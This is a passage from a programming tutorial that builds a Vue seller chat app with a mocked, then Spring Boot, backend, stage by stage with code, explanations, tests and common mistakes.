chatApi.send(chatId, text) \u2192 POST /api/chats/{id}/messages {text}\n        Spring: Controller (validate) \u2192 Service (seller owns chat?) \u2192 Repository (save) \u2192 Kafka event \u2192 WebSocket push to buyer\n   \u2190 201 {id, text, createdAt, \u2026}\n \u2192 store replaces temp with the saved message (status:'sent')   |  on error: status:'failed' + Retry\n \u2192 MessageList re-renders \u2192 nextTick \u2192 scroll to bottom\n```\n**State ownership:**\n| State | Lives in | Why |\n|---|---|---|\n| user, token | `auth` store | needed everywhere, survives navigation |\n| chats, filters, messagesByChat, active id, load/error flags | `chat` store | shared by sidebar, room, topbar badge |\n| orders to attach | `orders` store | server data |\n| draft text, modal open, selected order | local component `ref` | only one component cares |\n| which chat is open | **URL** (`/chats/:chatId`) | shareable, back button works |\n**Data contracts (JSON):**\n```json\n// GET /api/chats?q=&status=&page=0&size=20   \u2192 Spring Page\n{ \"content\": [ { \"id\": 1, \"buyerName\": \"Ravi\", \"lastMessage\": \"Is this available?\", \"lastMessageAt\": \"2026-10-30T09:12:00Z\", \"unread\": 2, \"status\": \"OPEN\" } ], \"totalElements\": 42, \"totalPages\": 3, \"number\": 0 }\n// GET /api/chats/1/messages?before=&limit=30\n[ { \"id\": 10, \"chatId\": 1, \"sender\": \"BUYER\", \"text\": \"Is this available?\", \"createdAt\": \"\u2026\", \"order\": null } ]\n// POST /api/chats/1/messages   body {\"text\":\"Yes\"}   \u2192 201 message\n// GET /api/orders?buyerId=\u2026    \u2192 [ { \"id\":\"A1001\",\"title\":\"Red Sneakers x1\",\"total\":1299,\"status\":\"PAID\" } ]\n// POST /api/chats/1/orders     body {\"orderId\":\"A1001\"} \u2192 201 message with order attached\n// POST /api/auth/login         body {\"email\",\"password\"} \u2192 200 {accessToken, expiresIn, user} | 401\n```\n**Build order and why:** tokens/base UI first (everything reuses them) \u2192 services (so UI never touches HTTP) \u2192 login (auth gate) \u2192 list \u2192 room \u2192 modal \u2192 integration. Each stage is runnable on its own.\n\n---\n## STAGE 1: Project setup, design tokens, base components\n**Goal:** a running Vue app with a consistent look and reusable UI parts.\n```bash\nnpm create vue@latest seller-chat    # choose: Router, Pinia, Vitest, ESLint, Prettier\ncd seller-chat && npm install && npm install axios\nnpm run dev                          # http://localhost:5173\n```\n`.env.development`: `VITE_API_BASE_URL=/api` and `VITE_USE_MOCK=true`.\n```css\n/* src/assets/styles/tokens.css (imported once in main.js) */\n:root{\n  --c-bg:#f5f7fa; --c-surface:#fff; --c-text:#1b2430; --c-muted:#6b7785; --c-line:#e1e6ec;\n  --c-brand:#0b6e75; --c-brand-contrast:#fff; --c-mine:#d6f1ef; --c-danger:#c0392b;\n  --r-md:10px; --sp-1:.25rem; --sp-2:.5rem; --sp-3:1rem; --sp-4:1.5rem; --z-modal:1000;\n}\n*,*::before,*::after{box-sizing:border-box}\nbody{margin:0;font:16px/1.5 system-ui,sans-serif;background:var(--c-bg);color:var(--c-text)}\n:focus-visible{outline:2px solid var(--c-brand);outline-offset:2px}\n.sr-only{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap}\n```\n```vue\n<!-- components/base/BaseButton.vue -->\n<script setup>\ndefineProps({ variant: { type: String, default: 'primary' }, loading: Boolean, type: { type: String, default: 'button' } })\n<\/script>\n<template>\n  <button :type=\"type\" :class=\"['btn', `btn--${variant}`]\" :disabled=\"loading || $attrs.disabled\">\n    <slot /><span v-if=\"loading\" class=\"sr-only\">Loading<\/span>\n  <\/button>\n<\/template>\n<style scoped>\n.btn{padding:.55rem 1rem;border:1px solid transparent;border-radius:var(--r-md);cursor:pointer;font:inherit}\n.btn--primary{background:var(--c-brand);color:var(--c-brand-contrast)}\n.btn--ghost{background:transparent;border-color:var(--c-line)}\n.btn:disabled{opacity:.6;cursor:not-allowed}\n<\/style>\n```\n**Line-by-line:** `defineProps` declares the public API (`variant`, `loading`, `type`) with defaults \u00b7 `type` defaults to `button` so a button inside a form doesn't submit accidentally \u00b7 `:class` array merges a fixed class with a computed variant class \u00b7 `:disabled` combines our `loading` with any `disabled` attribute the parent passes (non-prop attrs land in `$attrs`) \u00b7 `<slot />` renders the button label \u00b7 `scoped` keeps CSS local to this component.\nBuild the rest similarly: `BaseSpinner` (a CSS spinner with `role=\"status\"`), `BaseEmptyState` (props `title`, `description`, slot for an action), `BaseInput` (`defineModel`, label, error text wired with `aria-describedby`), `BaseModal` (native `<dialog>`, `v-model:open`, `#actions` slot).\n**Test:** a Vitest test that mounts `BaseButton` with `loading` and expects `disabled`.\n**Mistakes:** hard-coding colours in components (use tokens) \u00b7 forgetting `type=\"button\"` \u00b7 putting business logic in base components.\n\n---\n## STAGE 2: Services: HTTP layer with mock first\n**Goal:** the UI never knows whether data comes from a mock or Spring.\n```js\n// services/http.js\nimport axios from 'axios'\nimport { useAuthStore } from '@/stores/auth'\nexport const http = axios.create({ baseURL: import.meta.env.VITE_API_BASE_URL, timeout: 10000 })\nhttp.interceptors.request.use(cfg => {\n  const t = useAuthStore().token; if (t) cfg.headers.Authorization = `Bearer ${t}`\n  cfg.headers['X-Request-Id'] = crypto.randomUUID(); return cfg\n})\nhttp.interceptors.response.use(r => r.data, err => {\n  if (err.response?.status === 401) useAuthStore().logout()\n  return Promise.reject({ status: err.response?.status ?? 0, message: err.response?.data?.message ?? 'Network error', body: err.response?.data })\n})\n```\n```js\n// services/mock/db.js : the in-memory \"backend\"\nexport const db = {\n  chats: [\n    { id: 1, buyerName: 'Ravi', lastMessage: 'Is this available?', lastMessageAt: new Date().toISOString(), unread: 2, status: 'OPEN' },\n    { id: 2, buyerName: 'Asha', lastMessage: 'Thanks!', lastMessageAt: new Date(Date.now() - 3.6e6).toISOString(), unread: 0, status: 'CLOSED' },\n  ],\n  messages: { 1: [{ id: 10, chatId: 1, sender: 'BUYER', text: 'Is this available?', createdAt: new Date().toISOString(), order: null }], 2: [] },\n  orders: [{ id: 'A1001', title: 'Red Sneakers \u00d7 1', total: 1299, status: 'PAID' }, { id: 'A1002', title: 'Socks \u00d7 3', total: 399, status: 'PENDING' }],\n}\nexport const delay = (ms = 400) => new Promise(r => setTimeout(r, ms))\nexport const maybeFail = (p = 0.1) => { if (Math.random() < p) { const e = new Error('Server error'); e.status = 500; throw e } }\n```\n```js\n// services/mock/chatApi.mock.js\nimport { db, delay, maybeFail } from './db'\nexport const chatApiMock = {\n  async list({ q = '', status = 'all' } = {}) {\n    await delay()\n    let rows = db.chats.filter(c => c.buyerName.toLowerCase().includes(q.toLowerCase()))\n    if (status === 'unread') rows = rows.filter(c => c.unread > 0)\n    if (status === 'open') rows = rows.filter(c => c.status === 'OPEN')\n    return { content: rows, totalElements: rows.length }          // SAME shape as Spring's Page\n  },\n  async messages(id) { await delay(300); return [...(db.messages[id] ?? [])] },\n  async send(id, text) {\n    await delay(); maybeFail(0.15)                                  // 15% failures: so you can build the Retry UI\n    const m = { id: Date.now(), chatId: id, sender: 'SELLER', text, createdAt: new Date().toISOString(), order: null }\n    ;(db.messages[id] ??= []).push(m); return m\n  },\n  async attachOrder(id, orderId) {\n    await delay(); const order = db.orders.find(o => o.id === orderId)\n    const m = { id: Date.now(), chatId: id, sender: 'SELLER', text: '', createdAt: new Date().toISOString(), order }\n    ;(db.messages[id] ??= []).push(m); return m\n  },\n}\n```\n```js\n// services/chatApi.js: the ONE switch\nimport { http } from './http'\nimport { chatApiMock } from './mock/chatApi.mock'\nconst chatApiReal = {\n  list: params => http.get('/chats', { params }),\n  messages: (id, params) => http.get(`/chats/${id}/messages`, { params }),\n  send: (id, text) => http.post(`/chats/${id}/messages`, { text }),\n  attachOrder: (id, orderId) => http.post(`/chats/${id}/orders`, { orderId }),\n}\nexport const chatApi = import.meta.env.VITE_USE_MOCK === 'true' ? chatApiMock : chatApiReal\n```\n**Why this matters:** you can build and test loading, error, empty and retry UI **before the backend exists**; the mock mirrors Spring's response shapes (`content`, `totalElements`), so Stage 7 is flipping one env var. `maybeFail` forces you to handle failure early, which is what separates demo code from company code.\n**Mistakes:** mock returning a different shape than the real API (then Stage 7 breaks) \u00b7 importing axios in components \u00b7 forgetting `await delay()` so you never see the loading state.\n\n---\n## STAGE 3: Login: form, auth store, guard\n**Goal:** a user logs in; unauthenticated users are redirected to `/login?redirect=...`.\n```js\n// stores/auth.js\nexport const useAuthStore = defineStore('auth', () => {\n  const token = ref(sessionStorage.getItem('token')); const user = ref(JSON.parse(sessionStorage.getItem('user') ?? 'null'))\n  const isLoggedIn = computed(() => !!token.value)\n  async function login(creds) {\n    const r = await authApi.login(creds)                            // {accessToken, user}\n    token.value = r.accessToken; user.value = r.user\n    sessionStorage.setItem('token', r.accessToken); sessionStorage.setItem('user', JSON.stringify(r.user))\n  }\n  function logout() { token.value = null; user.value = null; sessionStorage.clear(); useChatStore().reset() }\n  return { token, user, isLoggedIn, login, logout }\n})\n```\n```vue\n<!-- views/LoginView.vue -->\n<script setup>\nimport { reactive, ref } from 'vue'\nimport { useRouter, useRoute } from 'vue-router'\nimport { useAuthStore } from '@/stores/auth'\nimport BaseButton from '@/components/base/BaseButton.vue'\nconst auth = useAuthStore(), router = useRouter(), route = useRoute()\nconst form = reactive({ email: '', password: '' })\nconst loading = ref(false), error = ref('')\nasync function onSubmit() {\n  if (!form.email || !form.password) { error.value = 'Enter email and password'; return }\n  loading.value = true; error.value = ''\n  try {\n    await auth.login({ ...form })\n    const r = route.query.redirect\n    router.replace(typeof r === 'string' && r.startsWith('/') && !r.startsWith('//') ? r : { name: 'chats' })\n  } catch (e) {\n    error.value = e.status === 401 ? 'Wrong email or password' : 'Could not sign in. Try again.'\n  } finally { loading.value = false }\n}\n<\/script>\n<template>\n  <main class=\"login\">\n    <form class=\"card\" @submit.prevent=\"onSubmit\" novalidate>\n      <h1>Seller login<\/h1>\n      <label for=\"email\">Email<\/label>\n      <input id=\"email\" type=\"email\" v-model.trim=\"form.email\" autocomplete=\"username\" required>\n      <label for=\"pw\">Password<\/label>\n      <input id=\"pw\" type=\"password\" v-model=\"form.password\" autocomplete=\"current-password\" required>\n      <p v-if=\"error\" class=\"error\" role=\"alert\">{{ error }}<\/p>\n      <BaseButton type=\"submit\" :loading=\"loading\">{{ loading ? 'Signing in\u2026' : 'Log in' }}<\/BaseButton>\n    <\/form>\n  <\/main>\n<\/template>\n<style scoped>\n.login{min-height:100dvh;display:grid;place-items:center;padding:var(--sp-3)}\n.card{width:min(100%,380px);display:grid;gap:var(--sp-2);background:var(--c-surface);padding:var(--sp-4);border-radius:var(--r-md);box-shadow:0 2px 12px rgb(0 0 0/.08)}\ninput{padding:.6rem;border:1px solid var(--c-line);border-radius:8px;font:inherit}\n.error{color:var(--c-danger);margin:0}\n<\/style>\n```\n**Line-by-line:** `@submit.prevent` stops the page reload \u00b7 early return shows a client error before any network call \u00b7 `loading` disables the button (no double submit) \u00b7 after success, `router.replace` (not `push`) so Back doesn't return to the login page \u00b7 the redirect is **validated** to stop open-redirect attacks (Module 45) \u00b7 `finally` always clears `loading` \u00b7 `autocomplete` values let password managers work \u00b7 `role=\"alert\"` announces errors to screen readers.\n**Guard (router/index.js):** the `beforeEach` from Module 39: no token \u2192 `{ name: 'login', query: { redirect: to.fullPath } }`.\n**Backend:** `POST /api/auth/login` \u2192 `AuthController` \u2192 `AuthenticationManager` \u2192 JWT. Responses: `200 {accessToken, expiresIn, user:{id,name}}` or `401`. Rate-limit login attempts.\n**Test:** mount `LoginView`; submit empty form \u2192 error shown; mock `auth.login` rejecting `{status:401}` \u2192 \"Wrong email or password\".\n**Mistakes:** `push` after login \u00b7 trusting `?redirect=` \u00b7 showing \"user not found\" vs \"wrong password\" (leaks which emails exist) \u00b7 not resetting stores on logout.\n\n---\n## STAGE 4: Chat list: search, filter, four UI states\n**Goal:** show conversations, search with debounce, filter by status, handle loading/error/empty.\n```js\n// stores/chat.js (excerpt)\nconst chats = ref([]), listStatus = ref('idle'), listError = ref(null)\nconst filters = reactive({ q: '', status: 'all' })\nconst unreadTotal = computed(() => chats.value.reduce((n, c) => n + c.unread, 0))\nasync function fetchChats() {\n  listStatus.value = 'loading'; listError.value = null\n  try { const page = await chatApi.list({ ...filters }); chats.value = page.content; listStatus.value = 'success' }\n  catch (e) { listError.value = e.message; listStatus.value = 'error' }\n}\n```\n```vue\n<!-- components/chat/ChatSidebar.vue -->\n<script setup>\nimport { watch, onMounted, onUnmounted } from 'vue'\nimport { storeToRefs } from 'pinia'\nimport { useRouter } from 'vue-router'\nimport { useChatStore } from '@/stores/chat'\nimport ChatItem from './ChatItem.vue'\nconst store = useChatStore(); const { chats, listStatus, listError, filters, activeId } = storeToRefs(store)\nconst router = useRouter()\nlet t\nwatch(() => filters.value.q, () => { clearTimeout(t); t = setTimeout(store.fetchChats, 350) })   // debounce typing\nwatch(() => filters.value.status, store.fetchChats)                                            // instant for tabs\nonMounted(store.fetchChats); onUnmounted(() => clearTimeout(t))\nconst open = id => router.push({ name: 'chat', params: { chatId: id } })\n<\/script>\n<template>\n  <aside class=\"sidebar\" aria-label=\"Conversations\">\n    <input v-model=\"filters.q\" type=\"search\" placeholder=\"Search chats\" aria-label=\"Search chats\">\n    <div class=\"tabs\" role=\"group\" aria-label=\"Filter\">\n      <button v-for=\"s in ['all','unread','open']\" :key=\"s\" :class=\"{ on: filters.status === s }\" :aria-pressed=\"filters.status === s\" @click=\"filters.status = s\">{{ s }}<\/button>\n    <\/div>\n    <BaseSpinner v-if=\"listStatus === 'loading' && !chats.length\" />\n    <p v-else-if=\"listStatus === 'error'\" role=\"alert\">{{ listError }} <button @click=\"store.fetchChats\">Retry<\/button><\/p>\n    <BaseEmptyState v-else-if=\"!chats.length\" title=\"No chats found\" description=\"Try a different search or filter.\" />\n    <ul v-else class=\"list\"><ChatItem v-for=\"c in chats\" :key=\"c.id\" :chat=\"c\" :active=\"c.id === activeId\" @select=\"open\" /><\/ul>\n  <\/aside>\n<\/template>\n```\n```vue\n<!-- ChatItem.vue: props {chat, active}; emit select(id) -->\n<script setup>\nimport { formatTime } from '@/utils/date'\ndefineProps({ chat: { type: Object, required: true }, active: Boolean })\nconst emit = defineEmits(['select'])\n<\/script>\n<template>\n  <li :class=\"['item', { active }]\" tabindex=\"0\" @click=\"emit('select', chat.id)\" @keydown.enter=\"emit('select', chat.id)\">\n    <div class=\"avatar\" aria-hidden=\"true\">{{ chat.buyerName[0] }}<\/div>\n    <div class=\"meta\"><strong>{{ chat.buyerName }}<\/strong><span class=\"preview\">{{ chat.lastMessage }}<\/span><\/div>\n    <time :datetime=\"chat.lastMessageAt\">{{ formatTime(chat.lastMessageAt) }}<\/time>\n    <b v-if=\"chat.unread\" class=\"badge\" :aria-label=\"`${chat.unread} unread`\">{{ chat.unread }}<\/b>\n  <\/li>\n<\/template>\n<style scoped>\n.item{display:grid;grid-template-columns:40px minmax(0,1fr) auto;gap:.5rem;padding:.75rem;cursor:pointer;align-items:center}\n.preview{display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}    /* ellipsis needs minmax(0,1fr) on the column */\n.item.active{background:var(--c-mine)}\n.badge{background:var(--c-brand);color:#fff;border-radius:999px;padding:0 .5rem}\n<\/style>\n```\n**Data flow:** typing \u2192 `filters.q` (store) \u2192 watcher debounces 350 ms \u2192 `fetchChats` \u2192 `listStatus` flips `loading \u2192 success/error` \u2192 the template picks spinner/error/empty/list \u2192 clicking an item emits `select` \u2192 the router pushes `/chats/:id` \u2192 `activeId` updates (Stage 5).\n**Why spinner only when `!chats.length`:** on a refetch you keep showing old rows instead of flashing blank.\n**Backend:** `GET /api/chats?q=&status=&page=&size=` \u2192 `@RequestParam` + `Pageable` \u2192 JPA `LIKE`/Mongo regex \u2192 `Page<ChatSummaryDto>`. Cache unread counts in Redis.\n**Test:** a store test with the mock API: `fetchChats` sets `success`; with a rejecting API sets `error`. Component test: `ChatItem` emits `select` with its id.\n**Mistakes:** firing a request per keystroke \u00b7 race: slow response for \"ra\" arriving after \"rav\" (abort stale requests) \u00b7 `key` as index \u00b7 forgetting `min-width: 0` so long previews break the layout.\n\n---\n## STAGE 5: Chat room: messages, optimistic send, auto-scroll\n**Goal:** open a chat, read messages, send with instant feedback and Retry on failure.\n```js\n// stores/chat.js (continued)\nconst activeId = ref(null), messagesByChat = ref({}), msgStatus = ref('idle'), msgError = ref(null)\nconst activeChat = computed(() => chats.value.find(c => c.id === activeId.value) ?? null)\nconst messages = computed(() => messagesByChat.value[activeId.value] ?? [])\nasync function openChat(id) {\n  activeId.value = Number(id); msgStatus.value = 'loading'; msgError.value = null\n  try { messagesByChat.value[id] = await chatApi.messages(id); msgStatus.value = 'success'; markRead(id) }\n  catch (e) { msgError.value = e.message; msgStatus.value = 'error' }\n}\nasync function sendMessage(text) {\n  const id = activeId.value\n  const temp = reactive({ id: `tmp-${crypto.randomUUID()}`, sender: 'SELLER', text, createdAt: new Date().toISOString(), status: 'sending', order: null })\n  ;(messagesByChat.value[id] ??= []).push(temp)                     // optimistic: show immediately\n  try { Object.assign(temp, await chatApi.send(id, text), { status: 'sent' }) }\n  catch { temp.status = 'failed' }                                  // keep the bubble; offer Retry\n}\nasync function retry(temp) {\n  temp.status = 'sending'\n  try { Object.assign(temp, await chatApi.send(activeId.value, temp.text), { status: 'sent' }) } catch { temp.status = 'failed' }\n}\n```\n**Optimistic UI explained:** the user shouldn't wait 400 ms to see their own message. We add a temporary bubble (`status:'sending'`), call the API, then **replace** the temp fields with the saved message (`Object.assign`) or mark it `failed`. The user never loses their text and can retry.\n```vue\n<!-- views/ChatRoomView.vue (container) -->\n<script setup>\nimport { watch, ref } from 'vue'\nimport { useRoute } from 'vue-router'\nimport { storeToRefs } from 'pinia'\nimport { useChatStore } from '@/stores/chat'\nconst route = useRoute(), store = useChatStore()\nconst { activeChat, messages, msgStatus, msgError } = storeToRefs(store)\nconst showAttach = ref(false)\nwatch(() => route.params.chatId, id => id && store.openChat(id), { immediate: true })   // runs on load AND when only the param changes\n<\/script>\n<template>\n  <section class=\"room\" v-if=\"activeChat\">\n    <ChatHeader :chat=\"activeChat\" @attach-order=\"showAttach = true\" />\n    <BaseSpinner v-if=\"msgStatus === 'loading'\" />\n    <p v-else-if=\"msgStatus === 'error'\" role=\"alert\">{{ msgError }} <button @click=\"store.openChat(route.params.chatId)\">Retry<\/button><\/p>\n    <BaseEmptyState v-else-if=\"!messages.length\" title=\"No messages yet\" description=\"Say hello to your buyer.\" />\n    <MessageList v-else :messages=\"messages\" @retry=\"store.retry\" />\n    <MessageComposer @send=\"store.sendMessage\" />\n    <AttachOrderModal v-model:open=\"showAttach\" :chat-id=\"activeChat.id\" />\n  <\/section>\n  <BaseEmptyState v-else title=\"Select a chat\" />\n<\/template>\n```\n```vue\n<!-- MessageList.vue: auto-scroll only if the user is already near the bottom -->\n<script setup>\nimport { ref, watch, nextTick, onMounted } from 'vue'\nconst props = defineProps({ messages: { type: Array, required: true } })\nconst emit = defineEmits(['retry'])\nconst box = ref(null)\nconst nearBottom = () => box.value.scrollHeight - box.value.scrollTop - box.value.clientHeight < 80\nasync function toBottom(force = false) { const stick = force || nearBottom(); await nextTick(); if (stick && box.value) box.value.scrollTop = box.value.scrollHeight }\nonMounted(() => toBottom(true))\nwatch(() => props.messages.length, () => toBottom())\n<\/script>\n<template>\n  <div ref=\"box\" class=\"messages\" role=\"log\" aria-live=\"polite\">\n    <MessageBubble v-for=\"m in messages\" :key=\"m.id\" :message=\"m\" @retry=\"emit('retry', m)\" />\n  <\/div>\n<\/template>\n```\n```vue\n<!-- MessageBubble.vue -->\n<script setup>\nimport { computed } from 'vue'\nimport { formatTime } from '@/utils/date'\nconst props = defineProps({ message: { type: Object, required: true } })\nconst emit = defineEmits(['retry'])\nconst mine = computed(() => props.message.sender === 'SELLER')\n<\/script>\n<template>\n  <div :class=\"['bubble', mine ? 'bubble--mine' : 'bubble--theirs']\">\n    <OrderCard v-if=\"message.order\" :order=\"message.order\" compact />\n    <p v-if=\"message.text\">{{ message.text }}<\/p>          <!-- {{ }} escapes user text \u2192 XSS-safe -->\n    <small>\n      <time :datetime=\"message.createdAt\">{{ formatTime(message.createdAt) }}<\/time>\n      <span v-if=\"message.status === 'sending'\"> \u00b7 Sending\u2026<\/span>\n      <button v-if=\"message.status === 'failed'\" @click=\"emit('retry')\">Failed \u00b7 Retry<\/button>\n    <\/small>\n  <\/div>\n<\/template>\n<style scoped>\n.bubble{max-width:min(75%,520px);padding:.5rem .75rem;border-radius:14px;overflow-wrap:anywhere;white-space:pre-wrap}\n.bubble--mine{align-self:flex-end;background:var(--c-mine)}\n.bubble--theirs{align-self:flex-start;background:var(--c-surface);border:1px solid var(--c-line)}\n<\/style>\n```\n```vue\n<!-- MessageComposer.vue -->\n<script setup>\nimport { ref, computed } from 'vue'\nconst emit = defineEmits(['send']); const text = ref('')\nconst canSend = computed(() => text.value.trim().length > 0 && text.value.length <= 500)\nfunction submit() { if (!canSend.value) return; emit('send', text.value.trim()); text.value = '' }\n<\/script>\n<template>\n  <form class=\"composer\" @submit.prevent=\"submit\">\n    <label for=\"msg\" class=\"sr-only\">Message<\/label>\n    <textarea id=\"msg\" v-model=\"text\" rows=\"1\" maxlength=\"500\" placeholder=\"Type a message\" @keydown.enter.exact.prevent=\"submit\"><\/textarea>\n    <button :disabled=\"!canSend\">Send<\/button>\n  <\/form>\n<\/template>\n```\n```css\n.room{display:flex;flex-direction:column;height:100%;min-width:0}\n.messages{flex:1;min-height:0;overflow-y:auto;display:flex;flex-direction:column;gap:.5rem;padding:1rem}   /* min-height:0 \u2192 ONLY the list scrolls */\n.composer{display:flex;gap:.5rem;padding:.5rem;border-top:1px solid var(--c-line)}\n.composer textarea{flex:1}\n```\n**Key details:** `.enter.exact.prevent` = Enter sends, Shift+Enter still makes a newline \u00b7 `nextTick` waits for Vue to update the DOM before measuring `scrollHeight` \u00b7 the \"near bottom\" check avoids yanking the user down while they read old messages \u00b7 `role=\"log\" aria-live=\"polite\"` announces new messages to screen readers \u00b7 `watch(..., { immediate:true })` handles the first load **and** `/chats/1 \u2192 /chats/2` where the component is reused and `onMounted` would not rerun.\n**Backend:** `GET /api/chats/{id}/messages?limit=30&before=<id>` (cursor pagination) \u00b7 `POST /api/chats/{id}/messages` \u2192 controller validates (`@NotBlank @Size(max=500)`), service checks the seller **owns** the chat (403 otherwise), repository saves, publishes a **Kafka** event; a consumer pushes it to the buyer via WebSocket. **Inbound real-time:** open a WebSocket in the layout's `onMounted`, `ws.onmessage = e => store.receive(JSON.parse(e.data))`, `ws.close()` in `onUnmounted`.\n**Test:** composer: empty text \u2192 Send disabled; Enter emits `send` with trimmed text and clears the field. Store: failing API marks the message `failed`; `retry` flips it to `sent`.\n**Mistakes:** mutating the array without a stable `key` (rows jump) \u00b7 scrolling before `nextTick` \u00b7 whole page scrolling because `min-height:0` is missing \u00b7 rendering message text with `v-html` \u00b7 losing the draft when send fails.\n\n---\n## STAGE 6: Attach order: modal, selection, order cards\n**Goal:** the seller picks one of the buyer's orders and sends it as a card inside the chat.\n```vue\n<!-- components/chat/OrderCard.vue: presentational: props in, event out -->\n<script setup>\nimport { formatINR } from '@/utils/format'\ndefineProps({ order: { type: Object, required: true }, selectable: Boolean, selected: Boolean, compact: Boolean })\ndefineEmits(['select'])\n<\/script>\n<template>\n  <component :is=\"selectable ? 'button' : 'div'\" type=\"button\"\n    :class=\"['order', { 'order--selected': selected, 'order--compact': compact }]\"\n    :aria-pressed=\"selectable ? selected : undefined\"\n    @click=\"selectable && $emit('select', order)\">\n    <strong>#{{ order.id }}<\/strong><span>{{ order.title }}<\/span>\n    <span>{{ formatINR(order.total) }}<\/span>\n    <span :class=\"['status', order.status.toLowerCase()]\">{{ order.status }}<\/span>\n  <\/component>\n<\/template>\n```\n```vue\n<!-- AttachOrderModal.vue: owns the \"which one is selected\" decision -->\n<script setup>\nimport { ref, watch } from 'vue'\nimport { useOrderStore } from '@/stores/orders'\nimport { useChatStore } from '@/stores/chat'\nconst props = defineProps({ open: Boolean, chatId: Number })\nconst emit = defineEmits(['update:open'])\nconst orders = useOrderStore(), chat = useChatStore()\nconst selected = ref(null), submitting = ref(false), error = ref('')\nwatch(() => props.open, async o => { if (o) { selected.value = null; error.value = ''; await orders.fetchOrders() } })   // load when opened\nasync function confirm() {\n  if (!selected.value) return\n  submitting.value = true; error.value = ''\n  try { await chat.attachOrder(props.chatId, selected.value.id); emit('update:open', false) }\n  catch { error.value = 'Could not attach order. Try again.' }\n  finally { submitting.value = false }\n}\n<\/script>\n<template>\n  <BaseModal :open=\"open\" title=\"Attach order\" @update:open=\"emit('update:open', $event)\">\n    <BaseSpinner v-if=\"orders.status === 'loading'\" />\n    <p v-else-if=\"orders.status === 'error'\" role=\"alert\">{{ orders.error }}<\/p>\n    <BaseEmptyState v-else-if=\"!orders.items.length\" title=\"No orders for this buyer\" />\n    <ul v-else class=\"orders\">\n      <li v-for=\"o in orders.items\" :key=\"o.id\"><OrderCard :order=\"o\" selectable :selected=\"selected?.id === o.id\" @select=\"selected = $event\" /><\/li>\n    <\/ul>\n    <p v-if=\"error\" role=\"alert\">{{ error }}<\/p>\n    <template #actions>\n      <BaseButton variant=\"ghost\" @click=\"emit('update:open', false)\">Cancel<\/BaseButton>\n      <BaseButton :loading=\"submitting\" :disabled=\"!selected\" @click=\"confirm\">Attach<\/BaseButton>\n    <\/template>\n  <\/BaseModal>\n<\/template>\n```\n**Store action (chat.js):**\n```js\nasync function attachOrder(chatId, orderId) {\n  const msg = await chatApi.attachOrder(chatId, orderId)           // throws on failure \u2192 the modal shows the error\n  ;(messagesByChat.value[chatId] ??= []).push(msg)                 // message carries the embedded order \u2192 bubble renders an OrderCard\n}\n```\n**Design decisions explained:** `selected` is **local** to the modal and reset on open (no stale selection) \u00b7 `OrderCard` is presentational: it shows data, emits `select`, and the parent decides what selection means (reusable in the bubble as `compact`, non-selectable) \u00b7 data loads **when the modal opens**, not at page load \u00b7 the **store action** does the API call and updates chat state; the modal only handles its own UI (submitting, error, closing) \u00b7 on failure the modal stays open for retry.\n**Backend:** `GET /api/orders?buyerId=` (orders of this chat's buyer, scoped to the seller) \u00b7 `POST /api/chats/{id}/orders {orderId}` \u2192 the service verifies the order belongs to **this seller and this buyer** (authorization, not just validation), creates a message with an `orderId` reference, returns the message with an embedded order summary. Errors: `403` not yours, `404` not found, `409` already attached \u2192 inline message.\n**Test:** open modal \u2192 orders load; select enables Attach; confirm calls `chat.attachOrder` with the id and closes; rejecting API keeps it open with the error.\n**Mistakes:** keeping the selection after closing \u00b7 fetching on every render instead of on open \u00b7 letting `OrderCard` call the API itself \u00b7 not disabling Attach until a selection exists.\n\n---\n## STAGE 7: Swap mock \u2192 Spring Boot, CORS, auth, hardening\n1. `.env.development`: `VITE_USE_MOCK=false`, `VITE_API_BASE_URL=/api`. In `vite.config.js` add a **dev proxy** so the browser sees one origin (no CORS in dev):\n```js\nserver: { proxy: { '/api': { target: 'http://localhost:8080', changeOrigin: true } } }\n```\nProduction: same origin behind nginx/Ingress, or a Spring CORS allow-list.\n2. **Match contracts** exactly: enum values (`sender: BUYER|SELLER`), ISO-8601 dates (`spring.jackson.serialization.write-dates-as-timestamps=false`), `Long` ids (number or string: be consistent), `Page` field names.\n3. **Spring controller skeleton:**\n```java\n@RestController @RequestMapping(\"/api/chats\")\nclass ChatController {\n  @GetMapping Page<ChatSummaryDto> list(@RequestParam(defaultValue=\"\") String q, @RequestParam(defaultValue=\"all\") String status, Pageable p, @AuthenticationPrincipal Seller s) { return svc.list(s.id(), q, status, p); }\n  @GetMapping(\"/{id}/messages\") List<MessageDto> messages(@PathVariable Long id, @RequestParam(required=false) Long before, @RequestParam(defaultValue=\"30\") int limit, @AuthenticationPrincipal Seller s) { return svc.messages(s.id(), id, before, limit); }\n  @PostMapping(\"/{id}/messages\") ResponseEntity<MessageDto> send(@PathVariable Long id, @Valid @RequestBody SendMessageRequest r, @AuthenticationPrincipal Seller s) { return ResponseEntity.status(201).body(svc.send(id, s.id(), r.text())); }\n}\n```\n4. **Consistent error body** via `@RestControllerAdvice`: `{status, message, errors:[{field,message}]}` so the interceptor's normalisation and form-error mapping work.\n5. 401 \u2192 interceptor logs out \u2192 guard sends to login. 6. Add **WebSocket/SSE** for inbound messages and `unread` updates. 7. `X-Request-Id` end to end. 8. **E2E:** login \u2192 search \u2192 open \u2192 send \u2192 attach.\n**Debug checklist when the integrated app misbehaves:** Network tab (URL, method, status, request payload, response) \u2192 compare with the DTO \u2192 backend log via request id \u2192 interceptors/headers \u2192 store mapping \u2192 template binding.\n**Common integration bugs:** `undefined` because the Spring field is `buyer_name` not `buyerName` \u00b7 dates arriving as arrays/timestamps \u00b7 403 from CSRF on POST (if using sessions) \u00b7 CORS preflight `OPTIONS` rejected \u00b7 double `/api/api` in the URL \u00b7 history-mode refresh 404.\n\n## 48.8 Stage summary and path to \"company-ready\"\n| Stage | You learn | Key files |\n|---|---|---|\n| 1 Setup/base UI | tokens, reusable components | `tokens.css`, `Base*.vue` |\n| 2 Services/mock | API abstraction, mock \u2194 real, failure simulation | `http.js`, `chatApi*.js` |\n| 3 Login | forms, auth store, guards, safe redirect | `LoginView`, `auth` store, router |\n| 4 Chat list | debounce, 4 UI states, store | `ChatSidebar`, `ChatItem` |\n| 5 Chat room | layout, optimistic UI, scroll, per-message errors | `ChatRoomView`, `Message*` |\n| 6 Attach order | modal, selection ownership, authorization | `AttachOrderModal`, `OrderCard` |\n| 7 Integrate | Spring contracts, proxy/CORS, hardening | env, `vite.config.js`, controllers |\n**Then add (company polish):** TypeScript types for the contracts \u00b7 unit/component/E2E tests \u00b7 WebSocket real-time \u00b7 infinite scroll upward with `IntersectionObserver` \u00b7 toasts 